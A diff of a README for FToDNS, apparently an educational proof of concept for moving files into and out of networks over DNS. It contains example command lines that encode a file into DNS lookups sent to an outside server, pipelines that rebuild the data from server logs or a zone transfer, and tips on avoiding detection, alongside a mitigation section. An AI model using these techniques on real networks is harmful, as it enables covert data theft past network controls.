@@ -4,9 +4,15 @@ Christopher Neitzert <chris@neitzert.com>
 ### What:
 A proof of concept that utilizes the Domain Name Service protocol, loosely, as it was intended for data delivery and exfiltration across network boundaries.
 
+		* Any adequate form of encryption is indistinguishable from noise
+		* Any form of indistinguishable noise therefore may be adequate encryption
+
 ### Why:
-The use of DNS for data exfiltration or VPN has been a hacker trope for the four decades that DNS has existed.
-Recently with the creation of [DNS over HTTPS](https://en.wikipedia.org/wiki/DNS_over_HTTPS) in order to protect those that may be censored we inadvertadnly create an uncontrolable channel for data in/exfiltration.
+This primarily is an intellectual exercise relating to practical information security in a networked environment.
+
+The use of DNS for data exfiltration or VPN has been a hacker trope for the four decades that DNS has existed. 
+The recent introduction of [DNS over HTTPS](https://en.wikipedia.org/wiki/DNS_over_HTTPS) takes an already incendiary security issue and douses it with petroleum.
+This post aims to be a few stray sparks near that issue. 
 
 There have been several impliementations of this concept and this Proof of Concept is not unique. 
 Although this implementation is not based on the previous PoCs, several interesting methods will be linked in the [Erratum.txt](https://github.com/neitzert/FToDNS/blob/master/Erratum.txt)
@@ -45,14 +51,20 @@ Additionally, there are two verbs in a basic file transfer; We will call them 'P
 		* ex: 
 			* host -6 -a -W60 $line.io 2001:db8:1:1:1:1:1:1 
 		* Detection avoidance considerations should be taken around timing, encoding, destination servers, and host call.
-	* Each query is logged by the destination DNS Server and easily extracted by inverse method of encoding.
+	* Each query is logged by the destination DNS Server and easily extracted by the inverse method of it's encoding.
 		* ex: 
 			* cat $NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
 
 
 #### Get File
 ![DNS](/images/FToDNS_GetFile.png)
-* A typical DNS client queries
+* The server operator chooses a file that they want to make available globally via DNS.
+	* The file is base64 encoded and written into a DNS Zone file and served globally in DNS.
+		* ex: 
+			* See [ZoneMaker](https://github.com/neitzert/FToDNS/blob/master/ZoneMaker.sh) for details on this process.
+	* The user who wishes to get the file then performs a zone transfer and extracts the file by the inverse method of it's encoding.
+		* ex:  As shown in [ZoneGet] (https://github.com/neitzert/FToDNS/blob/master/ZoneGet.sh) 
+			* host -t axfr $1 $2|grep $3 | sort -n| cut -f2 -d"-"| cut -f1 -d"."|/bin/base64 -d |/bin/base64 -d > $DESIRED_FILE_OUTPUT 
 
 
 
@@ -93,8 +105,6 @@ Additionally, there are two verbs in a basic file transfer; We will call them 'P
 
 
 
-
-
 ### How to Mitigate:
 This specific Proof of Concept creates several issues with its issuance and this document would not be complete without a short discussion on mitigation.
 
@@ -115,26 +125,26 @@ This specific Proof of Concept creates several issues with its issuance and this
 
 
 
-### File Descriptions:
+## File Descriptions:
 
-####Resolver.sh
+### Resolver.sh
 
 A simple script to encode a file into a very large number of DNS host look up queries for later collection and reassembly on the upstream DNS server 
 
 
-####ZoneGet.sh
+### ZoneGet.sh
 
 Simple script to query a DNS server and decode the output of an entire DNS zone where each CNAME entry in the zone is a line fragment of a double base64 encoded file created by the script ZoneMaker.sh. 
 
 
-####ZoneMaker.sh
+### ZoneMaker.sh
 
 Simple script to take a file and base64 encode it, write it into a DNS zone file for remote serving on a Bind9 DNS server.
 
 
 
  
-### Disclaimers 
+## Disclaimers 
 All standard disclaimers apply, no warranty, claims, or promises declared, made or implied.
 
 For educational, research, and entertainment purposes only. 
